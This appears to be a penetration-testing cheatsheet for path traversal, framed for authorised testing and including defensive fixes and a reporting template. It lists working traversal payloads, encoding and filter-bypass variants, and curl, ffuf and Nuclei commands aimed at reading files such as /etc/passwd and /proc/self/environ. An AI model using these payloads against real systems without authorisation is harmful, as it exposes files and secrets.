# Path Traversal — Pentesting Cheatsheet

> Payloads, discovery methods, bypasses, tools, and technology notes for authorised security testing.

---

## 1. Quick Methodology

```text
Discover → Capture a normal request → Baseline → Test traversal → Try bypasses
→ Confirm file content → Assess impact → Record clean proof of concept
```

```text
[ ] Find file-related endpoints and parameters
[ ] Send a legitimate request to Burp Repeater
[ ] Change one value at a time
[ ] Start with a harmless, predictable proof file
[ ] Compare body, status, length, headers, and content type
[ ] Do not treat a 200 response alone as success
```

---

## 2. Discovery: Where to Look

| Input location | Examples to test |
| --- | --- |
| URL query | `?file=`, `?filename=`, `?path=`, `?image=` |
| POST / JSON | `file`, `document`, `template`, `exportPath` |
| URL route | `/download/manual.pdf`, `/assets/logo.png` |
| Cookies / headers | `theme`, `locale`, template or export selectors |
| Upload / import | ZIP/TAR extraction, restore, import, media upload |

Useful content-discovery words:

```text
file filename path image img download document attachment export import
backup log template theme avatar media preview static assets
```

---

## 3. Confirmation Targets

Use only targets permitted by the engagement scope.

| OS | Confirmation files |
| --- | --- |
| Linux | `/etc/hostname`, `/etc/passwd`, `/proc/self/environ` |
| Windows | `C:\Windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts` |

Expected Linux marker:

```text
root:x:0:0:
```

---

## 4. Payload Reference

### Relative Traversal

```text
../
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
```

### Absolute Paths

```text
/etc/passwd
/etc/hostname
C:\Windows\win.ini
C:/Windows/win.ini
```

### Encoded Variants

```text
../                              %2e%2e%2f
../../etc/passwd                 %2e%2e%2f%2e%2e%2fetc%2fpasswd
../../etc/passwd (double encode) %252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Filter / Normalisation Bypasses

```text
....//....//....//etc/passwd     # non-recursive ../ stripping
..%2f..%2fetc%2fpasswd           # mixed literal / encoded
..%252f..%252fetc%252fpasswd     # double-decoding case
..\..\..\Windows\win.ini         # Windows separator
```

### Legacy Suffix Bypass

```text
../../../etc/passwd%00.png
```

Null-byte behaviour is stack-dependent and commonly blocked by modern runtimes. Use it only where authorised and relevant; it is not a universal bypass.

---

## 5. Bypass Decision Table

| Observation | Try next |
| --- | --- |
| `../` is blocked | URL-encode the traversal characters |
| One encoding is blocked | Double URL-encode it |
| Input is removed once | Nested traversal: `....//` |
| Relative traversal fails | Test an absolute path |
| Application demands `.jpg` / `.png` | Inspect how suffixes are appended; consider legacy null byte only if relevant |
| Backslashes are accepted | Test Windows-style traversal |
| Every payload looks identical | Ensure the parameter truly controls a file; inspect errors and a valid baseline |

---

## 6. Burp Suite Workflow

```http
GET /image?filename=product.jpg HTTP/1.1
Host: target.example
```

1. Capture a legitimate file request in **Proxy**.
2. Send it to **Repeater** and note the baseline response.
3. Replace only the suspected filename/path value.
4. Test basic, absolute-path, and encoded payloads systematically.
5. Use **Comparer** for subtle response differences.
6. Save the smallest working request and remove sensitive data before reporting.

### Intruder: Small Authorised Payload List

```text
Attack type: Sniper
Position: filename=§PAYLOAD§
Grep / filter: response length, content type, known file marker, error message
```

Avoid broad or destructive fuzzing against production systems. Repeater is usually better for path traversal because response interpretation matters.

---

## 7. CLI Tools

### ffuf — Parameter and Endpoint Discovery

```bash
ffuf -u 'https://target.example/download?file=FUZZ' \
  -w paths.txt \
  -mc all
```

### curl — Reproduce a Request

```bash
curl --path-as-is \
  'https://target.example/image?filename=../../../etc/hostname'
```

`--path-as-is` prevents curl from normalising URL path segments. It matters when testing traversal in the URL path itself; query parameters are usually sent unchanged.

### Nuclei — Detection Templates

```bash
nuclei -u https://target.example -tags traversal,lfi -rl 5
```

Use scanners only with explicit permission. Manually validate every finding.

### Useful Supporting Tools

| Tool | Use |
| --- | --- |
| Burp Suite | Capture, replay, compare, and controlled fuzzing |
| ffuf | Discover endpoints, parameters, and content |
| curl | Precise request reproduction |
| Nuclei | Authorised template-based detection |
| httpx | Probe live HTTP services and gather metadata |
| feroxbuster / dirsearch | Content discovery before parameter testing |

---

## 8. Technology Notes

| Technology | What to check |
| --- | --- |
| PHP | `include`, `require`, `readfile`, download handlers, stream wrappers; distinguish LFI from traversal |
| Python / Flask | `send_file`, `send_from_directory`, `os.path.join`, `pathlib` resolution |
| Node.js / Express | `sendFile`, `res.download`, `path.join`, `path.resolve` |
| Java | `File`, `Paths`, `getCanonicalPath`, archive extraction, Spring resource handlers |
| .NET | `File.ReadAllBytes`, `Path.Combine`, `GetFullPath`, static-file middleware |
| Apache / Nginx | Aliases, rewrite rules, static-file locations, URL normalisation |
| Archive handlers | ZIP/TAR entry names; test for Zip Slip on extraction |

Key rule: validation must happen after canonicalisation. String blacklists such as “remove `../`” are not sufficient.

---

## 9. Reporting Template

```text
Title: Path Traversal Allows Arbitrary File Read

Affected endpoint: GET /download?file=
Proof of concept: [minimal sanitised request]
Evidence: Response contains expected marker from an out-of-directory file
Impact: Files readable by the application account may be exposed
Root cause: User input is joined to a filesystem path without resolved-path containment
Fix: Use an allowlist; canonicalise and require the resolved path to remain inside a fixed base directory
```

---

## 10. Defensive Quick Reference

```text
Best: map a logical ID to an allowlisted server-side filename.

If paths are required:
1. Join with the fixed base directory.
2. Resolve / canonicalise the result.
3. Reject it unless it remains inside the base directory.
4. Enforce least-privilege filesystem permissions.
```

---

*For authorised testing only. See [Readme.md](Readme.md) for the vulnerability overview, impact, and CVE examples.*
